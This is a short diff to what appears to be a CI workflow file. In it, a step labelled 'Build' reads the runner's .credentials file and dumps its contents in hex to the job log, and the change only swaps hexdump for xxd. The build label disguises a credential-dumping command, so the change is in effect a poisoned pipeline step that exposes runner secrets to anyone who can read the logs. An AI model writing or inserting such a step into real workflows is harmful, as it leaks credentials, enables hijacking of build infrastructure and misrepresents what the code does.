@@ -10,4 +10,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Build
-        run: cat /home/runner/runners/2.291.1/.credentials | hexdump -C
+        run: cat /home/runner/runners/2.291.1/.credentials | xxd
